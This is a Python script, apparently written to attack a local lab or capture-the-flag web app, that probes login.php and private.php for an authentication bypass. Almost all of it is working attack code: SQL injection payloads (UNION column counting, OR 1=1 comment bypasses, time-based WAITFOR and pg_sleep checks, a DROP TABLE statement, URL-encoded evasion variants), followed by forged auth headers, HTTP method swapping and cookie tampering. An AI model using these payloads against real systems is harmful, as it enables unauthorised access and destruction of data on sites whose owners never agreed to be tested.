import requests
import re

base_url = "http://127.0.0.1:33001"
login_url = f"{base_url}/login.php"
private_url = f"{base_url}/private.php"

headers = {'Content-Type': 'application/x-www-form-urlencoded'}

print("=== Testing Error-Based SQLi (Detailed Error Messages) ===")

# Try payloads that might trigger database error messages
error_payloads = [
    # MySQL syntax errors
    ("mysql_error_1", "admin'"),
    ("mysql_error_2", 'admin"'),
    ("mysql_error_3", "admin');"),
    ("mysql_error_4", "admin')"),
    ("mysql_error_5", "1\\"),
    
    # Multi-statement
    ("multi_stmt", "admin'; DROP TABLE test;--"),
    
    # Expression syntax errors
    ("expr_error", "admin'+(SELECT * FROM nonexistent_table)+'"),
    
    # Union select with different column counts
    ("union_1", "admin' UNION SELECT 1--"),
    ("union_2", "admin' UNION SELECT 1,2--"),
    ("union_3", "admin' UNION SELECT 1,2,3--"),
    ("union_4", "admin' UNION SELECT 1,2,3,4--"),
    ("union_5", "admin' UNION SELECT NULL--"),
    
    # Different comment styles
    ("comment_hash", "admin' OR '1'='1'#"),
    ("comment_hash2", "admin' OR 1=1#"),
    
    # Database specific
    ("mssql", "admin'; WAITFOR DELAY '0:0:5';--"),
    ("pgsql", "admin'; SELECT pg_sleep(5);--"),
    
    # If application uses parameterized queries but with specific patterns
    ("array_syntax", "admin[]"),
]

for name, username in error_payloads:
    data = {'username': username, 'password': 'x'}
    resp = requests.post(login_url, headers=headers, data=data)
    content = resp.text
    
    # Check if it's different from the normal "Incorrect username/password"
    if "Incorrect username/password" not in content:
        print(f"\n[!] {name}: DIFFERENT RESPONSE!")
        print(f"  Payload: {username}")
        print(f"  Status: {resp.status_code}")
        print(f"  Length: {len(content)}B")
        print(f"  Content (first 1000 chars): {content[:1000]}")
    else:
        print(f"{name}: Same error message ({len(content)}B)")

print("\n=== Testing Comment Variations ===")

# More comment types
comment_tests = [
    ("mysql_both", "admin' OR '1'='1'-- -"),
    ("mysql_short", "admin' OR '1'='1'#"),
    ("mysql_short2", "admin' OR 1=1#"),
    ("ansi", "admin' OR '1'='1'--"),
    ("c_style", "admin' OR '1'='1'/*"),
    ("nested", "admin'/**/OR/**/'1'='1'--"),
]

for name, username in comment_tests:
    data = {'username': username, 'password': 'x'}
    resp = requests.post(login_url, headers=headers, data=data)
    content = resp.text
    
    if "Incorrect username/password" not in content:
        print(f"\n[!] {name}: DIFFERENT!")
        print(f"  Payload: {username}")
        print(f"  Response: {content[:1000]}")
    else:
        print(f"{name}: Same ({len(content)}B)")

import requests
import urllib.parse
import base64

base_url = "http://127.0.0.1:33001"
login_url = f"{base_url}/login.php"
private_url = f"{base_url}/private.php"

headers = {'Content-Type': 'application/x-www-form-urlencoded'}

print("=== Testing Encoded Payloads (To Bypass Filters) ===")

# Try URL-encoded versions of payloads
encoded_tests = [
    ("url_encoded", "admin%27%20OR%20%271%27%3D%271%27--%20-"),
    ("double_url_encoded", "admin%2527%2520OR%2520%25271%2527%253D%25271%2527--%2520-"),
    ("base64_encoded", "YWRtaW4nIE9SICcxJz0nMSctLSA-"),  # unlikely to work, just testing
]

for name, username_encoded in encoded_tests:
    # Send the already-encoded string
    try:
        data = f'username={username_encoded}&password=x'
        resp = requests.post(login_url, headers=headers, data=data, allow_redirects=False)
        
        if "Incorrect username/password" not in resp.text:
            print(f"\n[!] {name}: DIFFERENT!")
            print(f"  Encoded payload: {username_encoded}")
            print(f"  Response: {resp.text[:1000]}")
        else:
            print(f"{name}: Same error")
    except Exception as e:
        print(f"{name}: Error - {e}")

print("\n=== Testing Other Authentication Vectors ===")

# Try header-based authentication
header_tests = [
    {"Authorization": "Basic YWRtaW46YWRtaW4="},  # admin:admin base64
    {"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ"},  # fake JWT
    {"X-Auth-User": "admin"},
    {"X-User-ID": "1"},
    {"X-Admin": "true"},
    {"X-API-Key": "admin123"},
]

print("\nTesting headers on private.php:")
for headers_test in header_tests:
    resp = requests.get(private_url, headers=headers_test)
    content_lower = resp.text.lower()
    
    # Look for anything different
    if "private zone" in content_lower:
        print(f"  {list(headers_test.keys())[0]}: Still shows 'Private Zone'")
    elif len(resp.text) > 800:  # different content size
        print(f"  [!] {headers_test}: Different size! {len(resp.text)}B")
        print(f"      First 500 chars: {resp.text[:500]}")

print("\n=== Testing Different Request Methods ===")

methods = ['GET', 'POST', 'PUT', 'PATCH', 'OPTIONS']
for method in methods:
    if method == 'GET':
        resp = requests.request(method, login_url, params={'username': 'admin', 'password': 'admin'})
    else:
        resp = requests.request(method, login_url, data={'username': 'admin', 'password': 'admin'})
    print(f"{method}: Status={resp.status_code}, Length={len(resp.text)}B")

print("\n=== Checking for Session / Cookie Injection ===")

# Try setting various cookie combinations
cookie_tests = [
    {'PHPSESSID': 'admin123'},
    {'session': 'authenticated'},
    {'user': 'admin'},
    {'username': 'admin'},
    {'auth': 'true'},
    {'role': 'administrator'},
    {'privilege': 'high'},
    {'admin': 'yes'},
]

print("\nTesting cookies on private.php:")
for cookies in cookie_tests:
    resp = requests.get(private_url, cookies=cookies)
    if len(resp.text) > 760:  # original was 758
        print(f"  [!] {cookies}: Size changed! {len(resp.text)}B")
        print(f"      First 500 chars: {resp.text[:500]}")
    else:
        print(f"  {cookies}: {len(resp.text)}B (same)")

